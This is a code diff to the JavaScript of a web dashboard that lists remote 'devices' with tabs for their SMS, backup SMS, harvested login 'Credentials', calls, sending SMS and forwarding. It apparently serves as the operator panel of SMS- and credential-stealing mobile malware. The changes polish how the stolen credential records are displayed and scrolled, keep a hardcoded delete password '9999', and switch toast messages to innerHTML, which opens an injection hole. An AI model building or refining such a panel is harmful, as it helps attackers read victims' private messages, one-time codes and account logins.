@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Live Realtime Data with No Blink - Complete        */
+/* app.js - Complete Fixed - Smooth, No Blink, All Features    */
 /* ============================================================ */
 
 // ============================================================
@@ -46,10 +46,11 @@ let isUpdatingUI = false;
 let deviceOnlineStatus = {};
 let renderTimeout = null;
 let lastRenderTime = 0;
-const MIN_RENDER_INTERVAL = 500;
+const MIN_RENDER_INTERVAL = 300;
 let lastDataHash = '';
 let deletePassword = '9999';
 let isFirstLoad = true;
+let isInitialRender = true;
 
 // ============================================================
 // DOM REFS
@@ -192,6 +193,7 @@ function performRender() {
                 loadBackupSmsForDevice(selected);
             }
         }
+        isInitialRender = false;
     } finally {
         isRendering = false;
     }
@@ -368,6 +370,7 @@ function deleteDeviceSms(devId) {
 // RENDER DEVICES OPTIMIZED - NO BLINK
 // ============================================================
 function renderDevicesOptimized() {
+    if (isUpdatingUI) return;
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
     
@@ -380,7 +383,7 @@ function renderDevicesOptimized() {
         if (searchQuery) msg = 'No devices match "' + searchQuery + '"';
         else if (currentFilter === 'online') msg = 'No online devices';
         else if (currentFilter === 'offline') msg = 'No offline devices';
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-search" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${msg}</div>`;
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-search empty-icon"></i>${msg}</div>`;
         return;
     }
     
@@ -430,17 +433,41 @@ function renderDevicesOptimized() {
                 let fields = '';
                 for (let k in rec) {
                     if (k === 'key' || k === 'timestamp') continue;
+                    const value = rec[k] || 'N/A';
                     fields += `<div class="login-field">
                         <span class="field-label">${k}:</span>
-                        <span class="field-value" id="field-${devId}-${idx}-${k}">${rec[k]}</span>
-                        <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')"><i class="fas fa-copy"></i></button>
+                        <span class="field-value" id="field-${devId}-${idx}-${k}">${value}</span>
+                        <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')" title="Copy ${k}">
+                            <i class="fas fa-copy"></i>
+                        </button>
                     </div>`;
                 }
                 return `<div class="login-card">
-                    <div class="login-card-header">Record ${idx+1}</div>
+                    <div class="login-card-header">
+                        <span>Record ${idx+1}</span>
+                        <span class="record-number">#${idx+1}</span>
+                    </div>
                     <div class="login-card-body">${fields}</div>
                 </div>`;
             }).join('');
+        }
+        
+        // Scroll indicator for credentials
+        let scrollIndicator = '';
+        if (devLoginList.length > 5) {
+            scrollIndicator = `
+                <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;">
+                    <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToTop('${devId}')">
+                        <i class="fas fa-arrow-up"></i> Top
+                    </button>
+                    <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToBottom('${devId}')">
+                        <i class="fas fa-arrow-down"></i> Bottom
+                    </button>
+                    <span style="font-size:9px;color:var(--text-muted);display:flex;align-items:center;padding:0 8px;">
+                        ${devLoginList.length} records
+                    </span>
+                </div>
+            `;
         }
         
         html += `
@@ -491,8 +518,8 @@ function renderDevicesOptimized() {
                     <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                             <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
-                            <div>
-                                <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;margin-right:4px;">⛶ Full</button>
+                            <div style="display:flex;gap:4px;">
+                                <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
                                 ${totalSms > 0 ? `<button onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="background:var(--red);color:#fff;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">🗑️ Delete</button>` : ''}
                             </div>
                         </div>
@@ -505,13 +532,19 @@ function renderDevicesOptimized() {
 
                     <!-- Login Section -->
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
-                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
-                            <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials (${devLoginList.length})</h4>
-                            ${devLoginList.length > 0 ? `<button onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="background:var(--red);color:#fff;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">🗑️ Delete All</button>` : ''}
+                        <div class="credentials-header">
+                            <h4>🔑 All Credentials</h4>
+                            <div class="header-actions">
+                                <span class="credentials-count">
+                                    <i class="fas fa-key"></i> ${devLoginList.length}
+                                </span>
+                                ${devLoginList.length > 0 ? `<button class="login-delete-all-btn" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')">🗑️ Delete All</button>` : ''}
+                            </div>
                         </div>
-                        <div class="login-cards">
-                            ${devLoginList.length === 0 ? '<div class="empty-luxury">No credentials found</div>' : allLoginHtml}
+                        <div class="login-cards" id="login-cards-${devId}">
+                            ${devLoginList.length === 0 ? '<div class="empty-luxury"><i class="fas fa-key"></i>No credentials found</div>' : allLoginHtml}
                         </div>
+                        ${scrollIndicator}
                     </div>
 
                     <!-- Call Section -->
@@ -576,16 +609,17 @@ function renderDevicesOptimized() {
                     <!-- Delete Section -->
                     <div class="section-box ${activeTab === 'delete' ? 'active' : ''}" id="sec-delete-${devId}" style="border-color:var(--red);">
                         <h4 style="color:var(--red);font-size:13px;">🗑️ Delete Device Data</h4>
-                        <div style="display:flex;flex-direction:column;gap:8px;">
+                        <div class="device-delete-actions">
                             <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                                 <i class="fas fa-trash"></i> Delete All SMS
                             </button>
-                            <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;background:var(--purple);">
+                            <button class="btn-luxury btn-purple-delete" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                                 <i class="fas fa-trash"></i> Delete All Credentials
                             </button>
                         </div>
-                        <div style="margin-top:8px;font-size:10px;color:var(--text-muted);padding:8px;background:rgba(239,68,68,0.05);border-radius:6px;border:1px solid rgba(239,68,68,0.1);">
-                            ⚠️ Password required: <span style="color:var(--gold);font-weight:600;">9999</span>
+                        <div class="delete-password-hint">
+                            <span class="hint-icon">⚠️</span>
+                            Password required: <span class="hint-password">9999</span>
                         </div>
                     </div>
                 </div>
@@ -594,6 +628,13 @@ function renderDevicesOptimized() {
     });
     
     container.innerHTML = html;
+    
+    // Auto scroll credentials if login tab is active
+    displayKeys.forEach(devId => {
+        if (activeTabs[devId] === 'login') {
+            setTimeout(() => autoScrollCredentials(devId), 200);
+        }
+    });
     
     if (hasMore) {
         const remaining = keys.length - end;
@@ -615,6 +656,51 @@ function renderDevicesOptimized() {
         };
         container.insertBefore(backBtn, container.firstChild);
     }
+}
+
+// ============================================================
+// SCROLL CREDENTIALS FUNCTIONS
+// ============================================================
+function scrollCredentialsToBottom(devId) {
+    const container = document.getElementById(`login-cards-${devId}`);
+    if (container) {
+        container.scrollTo({
+            top: container.scrollHeight,
+            behavior: 'smooth'
+        });
+        showToast('📜 Scrolled to bottom', 'info', 1000);
+    }
+}
+
+function scrollCredentialsToTop(devId) {
+    const container = document.getElementById(`login-cards-${devId}`);
+    if (container) {
+        container.scrollTo({
+            top: 0,
+            behavior: 'smooth'
+        });
+        showToast('📜 Scrolled to top', 'info', 1000);
+    }
+}
+
+function autoScrollCredentials(devId) {
+    setTimeout(() => {
+        const container = document.getElementById(`login-cards-${devId}`);
+        if (container && container.children.length > 5) {
+            setTimeout(() => {
+                container.scrollTo({
+                    top: container.scrollHeight,
+                    behavior: 'smooth'
+                });
+                setTimeout(() => {
+                    container.scrollTo({
+                        top: 0,
+                        behavior: 'smooth'
+                    });
+                }, 600);
+            }, 300);
+        }
+    }, 100);
 }
 
 // ============================================================
@@ -677,7 +763,7 @@ function renderAllSmsOptimized() {
     }
     
     if (allSmsList.length === 0) {
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${smsFilterDevice ? 'No messages for ' + smsFilterDevice : 'No messages found'}</div>`;
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>${smsFilterDevice ? 'No messages for ' + smsFilterDevice : 'No messages found'}</div>`;
         loadMore.style.display = 'none';
         return;
     }
@@ -701,7 +787,7 @@ function renderAllSmsOptimized() {
 }
 
 // ============================================================
-// TOGGLE DEVICE - NO BLINK
+// TOGGLE DEVICE - SMOOTH
 // ============================================================
 function toggleDevice(devId) {
     if (isUpdatingUI) return;
@@ -721,6 +807,10 @@ function toggleDevice(devId) {
             
             if (expandedDevices[devId]) {
                 setTimeout(() => checkDeviceStatus(devId), 200);
+                // Auto scroll credentials if login tab is active
+                if (activeTabs[devId] === 'login') {
+                    setTimeout(() => autoScrollCredentials(devId), 300);
+                }
             }
         }
     } finally {
@@ -729,7 +819,7 @@ function toggleDevice(devId) {
 }
 
 // ============================================================
-// SET TAB - NO BLINK
+// SET TAB - SMOOTH
 // ============================================================
 function setTab(devId, tab) {
     if (isUpdatingUI) return;
@@ -761,7 +851,10 @@ function setTab(devId, tab) {
             
             buttons.forEach(btn => {
                 if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
-                else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') btn.classList.add('active-login');
+                else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') {
+                    btn.classList.add('active-login');
+                    setTimeout(() => autoScrollCredentials(devId), 300);
+                }
                 else if (btn.textContent.trim().includes('📞') && targetTab === 'call') btn.classList.add('active-call');
                 else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
                 else if (btn.textContent.trim().includes('🔀') && targetTab === 'fwd') btn.classList.add('active-fwd');
@@ -907,7 +1000,7 @@ function loadMoreDeviceSms(devId) {
 }
 
 // ============================================================
-// TOGGLE PANEL
+// TOGGLE PANEL - SMOOTH
 // ============================================================
 function togglePanel(panel) {
     const panels = ['devices', 'sms', 'backup', 'analytics'];
@@ -1383,7 +1476,7 @@ function openBackupSmsModal() {
         if (snap.exists()) {
             renderAllBackupSms(body, snap.val());
         } else {
-            body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No backup messages</div>';
+            body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>No backup messages</div>';
         }
     }).catch(() => {
         body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
@@ -1498,12 +1591,13 @@ function showToast(message, type = 'info', duration = 2800) {
     const container = $('toastContainer');
     const toast = document.createElement('div');
     toast.className = `toast-luxury ${type}`;
-    toast.textContent = message;
+    toast.innerHTML = message;
     container.appendChild(toast);
     
     setTimeout(() => {
         toast.style.opacity = '0';
-        toast.style.transition = 'opacity 0.3s';
+        toast.style.transform = 'translateY(-10px)';
+        toast.style.transition = 'all 0.3s ease';
         setTimeout(() => toast.remove(), 300);
     }, duration);
 }
@@ -1540,7 +1634,7 @@ document.addEventListener('DOMContentLoaded', function() {
         searchInput.addEventListener('input', function() {
             const val = this.value;
             if (clearBtn) {
-                clearBtn.style.display = val ? 'block' : 'none';
+                clearBtn.style.display = val ? 'flex' : 'none';
             }
             clearTimeout(debounceTimer);
             debounceTimer = setTimeout(() => {
